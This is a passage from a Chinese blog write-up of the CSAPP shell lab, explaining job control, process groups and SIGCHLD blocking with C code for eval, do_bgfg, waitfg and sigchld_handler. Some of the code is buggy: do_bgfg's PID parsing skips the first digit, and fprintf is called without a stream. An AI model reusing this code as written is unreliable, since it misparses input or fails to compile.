class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Here are helper routines that we've provided for you */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdline, <span class="type">char</span> **argv)</span></span>; </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigquit_handler</span><span class="params">(<span class="type">int</span> sig)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clearjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *job)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">maxjid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>; </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">addjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid, <span class="type">int</span> state, <span class="type">char</span> *cmdline)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">deletejob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid)</span></span>; </span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">fgpid</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">job_t</span> *<span class="built_in">getjobpid</span>(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">pid_t</span> pid);</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">job_t</span> *<span class="built_in">getjobjid</span>(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs, <span class="type">int</span> jid); </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">pid2jid</span><span class="params">(<span class="type">pid_t</span> pid)</span></span>; </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">listjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">usage</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unix_error</span><span class="params">(<span class="type">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">app_error</span><span class="params">(<span class="type">char</span> *msg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="type">void</span> <span class="title">handler_t</span><span class="params">(<span class="type">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">handler_t</span> *<span class="title">Signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">handler_t</span> *handler)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Some function defined by myself*/</span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">Fork</span><span class="params">()</span></span>;<span class="comment">//即CSAPP上提到的错误处理封装函数,不过用起来并不是很顺手</span></span><br></pre></td></tr></tbody></table></figure><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>调用parseline函数解析命令行得到argv参数列表,获得前台或后台运行的标志state.<br>调用builtin_cmd检测是否是内置命令,若是则在其中处理,否则返回eval函数fork出子进程,子进程execve方式启动新程序,父进程将job通过addjob加入全局jobs列表,若为前台运行则调用waitfg等待前台程序结束.</p><p>需要注意的问题有两个.<br>第一个:</p><blockquote><p>When you run your shell from the standard Unix shell, your shell is running in the foreground processgroup.  If your shell then creates a child process, by defaultthat child will also be a member of theforeground process group. Since typingctrl-csends a SIGINT to every process in the foregroundgroup, typingctrl-cwill send a SIGINT to your shell, as well as to every process that your shellcreated, which obviously isn’t correct.Here  is  the  workaround:   After  thefork,  but  before  theexecve,  the  child  process  should  callsetpgid(0, 0), which puts the child in a new process group whose group ID is identical to thechild’s PID. This ensures that there will be only one process,  your shell, in the foreground processgroup.   When you typectrl-c, the shell should catch the resulting  SIGINT and then forward itto the appropriate foreground job (or more precisely, the process group that contains the foregroundjob).</p></blockquote><p>因为我们的shell(tsh)是运行在Unix shell之上的,所以当kernel发出一个SIGINT之类的信号,Unix shell会将信号同时发送给tsh以及所有tsh创建的进程(因为tsh是当前shell的前台进程,shell的默认行为会将SIGINT信号发送给整个<code>前台进程组</code>),而我们想要实现的只是将信号发送给tsh的前台进程组.所以在fork子进程后,需要setpgid使得子进程的进程组与父进程独立.</p><blockquote><p>int setpgid(pid_t pid, pid_t pgid);<br>该函数可以用于将一个进程加入到指定的进程组中，或者创建一个新的进程组。具体的行为取决于 pid 参数的取值：<br>    1. 如果 pid 参数为 0，则表示将调用进程加入到与调用进程的PID相同的进程组中。<br>    2. 如果 pgid 参数为 0，则表示将 pid 指定的进程的进程组ID设置为其自身的PID。<br>    3. 如果 pgid 参数不为 0，则表示将 pid 指定的进程的进程组ID设置为 pgid。<br>    setpgid 函数的返回值为 0 表示成功，返回值为 -1 表示出现错误，此时可以通过查看 errno 变量来获取具体的错误信息。</p></blockquote><p>第二个:</p><blockquote><p>In eval, the parent must usesigprocmaskto block SIGCHLD signals before it forks the child,and then unblock these signals, again usingsigprocmaskafter it adds the child to the job list by calling addjob. Since children inherit the blocked vectors of their parents, the child must be sureto then unblock SIGCHLD signals before it execs the new program.6<br>    The parent needs to block theSIGCHLDsignals in this way in order to avoid the race condition wherethe child is reaped by sigchld handler(and thus removed from the job list) before the parent calls addjob.</p></blockquote><p>由于进程间执行顺序是不确定的,子进程在被fork之后在最极端的情况下可以一直执行到结束而父进程还刚从fork函数返回.也就是说,父进程一旦fork子进程,随时可能收到SIGCHLD信号(子进程随时可能暂停或终止).设想一下在父进程fork子进程后,addjob之前,子进程结束发出SIGCHLD信号,父进程捕获信号并在信号处理程序中deletejob删除一个不存在的job,这可能引发错误或被deletejob无视(取决于deletejob的实现),父进程从信号处理函数返回后再调用addjob则会将一个已经终止的进程加入任务列表中.这显然是错误的.所以需要在fork函数之前阻塞SIGCHLD信号,addjob后恢复.需要注意的是子进程会继承父进程的阻塞状态,所以需要在execve之前恢复阻塞.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * eval - Evaluate the command line that the user has just typed in</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the user has requested a built-in command (quit, jobs, bg or fg)</span></span><br><span class="line"><span class="comment"> * then execute it immediately. Otherwise, fork a child process and</span></span><br><span class="line"><span class="comment"> * run the job in the context of the child. If the job is running in</span></span><br><span class="line"><span class="comment"> * the foreground, wait for it to terminate and then return.  Note:</span></span><br><span class="line"><span class="comment"> * each child process must have a unique process group ID so that our</span></span><br><span class="line"><span class="comment">//  * background children don't receive SIGINT (SIGTSTP) from the kernel</span></span><br><span class="line"><span class="comment"> * when we type ctrl-c (ctrl-z) at the keyboard.  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">char</span>* argv[MAXARGS];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> state;</span><br><span class="line">    <span class="type">sigset_t</span> mask,prev;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;mask);</span><br><span class="line">    <span class="built_in">sigaddset</span>(&amp;mask,SIGCHLD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">parseline</span>(cmdline,argv))</span><br><span class="line">        state = BG;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        state = FG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">builtin_cmd</span>(argv))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_BLOCK,&amp;mask,&amp;prev);</span><br><span class="line">        <span class="keyword">if</span>((pid = <span class="built_in">Fork</span>())==<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">           <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">setpgid</span>(<span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="built_in">unix_error</span>(<span class="string">"setpgid error"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">execve</span>(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="built_in">unix_error</span>(<span class="string">"%s: command not found"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">addjob</span>(jobs,pid,state,cmdline);</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(state==FG)</span><br><span class="line">            <span class="built_in">waitfg</span>(pid);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>,<span class="built_in">pid2jid</span>(pid),pid,cmdline);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"quit"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"fg"</span>)||!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"bg"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">do_bgfg</span>(argv);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"jobs"</span>))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">listjobs</span>(jobs);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="dofgbg"><a href="#dofgbg" class="headerlink" title="dofgbg"></a>dofgbg</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> jid;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job;</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">'%'</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>((jid = <span class="built_in">atoi</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>]))&lt;=<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>((job = <span class="built_in">getjobjid</span>(jobs,jid))==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such job\n"</span>, jid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>((pid = <span class="built_in">atoi</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>]))&lt;=<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>((job = <span class="built_in">getjobpid</span>(jobs,pid))==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such process\n"</span>, pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"bg"</span>))</span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-job-&gt;pid,SIGCONT)&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill error"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">"fg"</span>))</span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-job-&gt;pid,SIGCONT)&lt;<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill error"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">        <span class="built_in">waitfg</span>(job-&gt;pid);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"do_bgfg: Internal error"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h3><p>我使用了和write up上不同的处理,具体见注释.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * waitfg - Block until process pid is no longer the foreground process</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs,pid);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//根据write up上的描述,waitfg使用 use a busy loop around thesleepfunction.的方式实现</span></span><br><span class="line">    <span class="comment">// while(1)</span></span><br><span class="line">    <span class="comment">// {</span></span><br><span class="line">    <span class="comment">//     if(job-&gt;state==FG)</span></span><br><span class="line">    <span class="comment">//         sleep(1);</span></span><br><span class="line">    <span class="comment">//     else</span></span><br><span class="line">    <span class="comment">//         break;</span></span><br><span class="line">    <span class="comment">// }</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//但CSAPP书上提到这种方法执行太慢,故采用sigsuspend函数</span></span><br><span class="line">    <span class="type">sigset_t</span> mask,prev;</span><br><span class="line">    <span class="comment">//获取当前set存入prev</span></span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;mask);</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK,&amp;mask,&amp;prev);</span><br><span class="line">    <span class="keyword">while</span>(job-&gt;state==FG)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sigsuspend</span>(&amp;prev);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="sigchld-handler"><a href="#sigchld-handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h3><p>注意Linux的显式信号阻塞可能丢弃掉一部分SIGCHLD信号,所以在sigchld_handler函数的一次调用中需要尽可能多的回收子进程.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever</span></span><br><span class="line"><span class="comment"> *     a child job terminates (becomes a zombie), or stops because it</span></span><br><span class="line"><span class="comment"> *     received a SIGSTOP or SIGTSTP signal. The handler reaps all</span></span><br><span class="line"><span class="comment"> *     available zombie children, but doesn't wait for any other</span></span><br><span class="line"><span class="comment"> *     currently running children to terminate.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> jid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigchld_handler: entering"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((pid = <span class="built_in">waitpid</span>(<span class="number">-1</span>,&amp;status,WNOHANG|WUNTRACED))&gt;<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>((job = <span class="built_in">getjobpid</span>(jobs,pid))==<span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="string">"Lost track of (%d)\n"</span>,pid);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        jid = job-&gt;jid;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">WIFSTOPPED</span>(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>,jid,job-&gt;pid,<span class="built_in">WSTOPSIG</span>(status));</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">WIFEXITED</span>(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">deletejob</span>(jobs,pid))</span><br><span class="line">                <span class="keyword">if</span>(verbose)</span><br><span class="line">                {</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"sigchld_handler: Job [%d] (%d) deleted\n"</span>, jid, pid);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"sigchld_handler: Job [%d] (%d) terminates OK (status %d)\n"</span>, jid, pid, <span class="built_in">WEXITSTATUS</span>(status));</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">deletejob</span>(jobs,pid))</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span>(verbose)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"sigchld_handler: Job [%d] (%d) deleted\n"</span>, jid, pid);</span><br><span class="line">            }</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, jid, pid, <span class="built_in">WTERMSIG</span>(status));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigchld_handler: exiting"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="sigint-handler、sigtstp-handler"><a href="#sigint-handler、sigtstp-handler" class="headerlink" title="sigint_handler、sigtstp_handler"></a>sigint_handler、sigtstp_handler</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 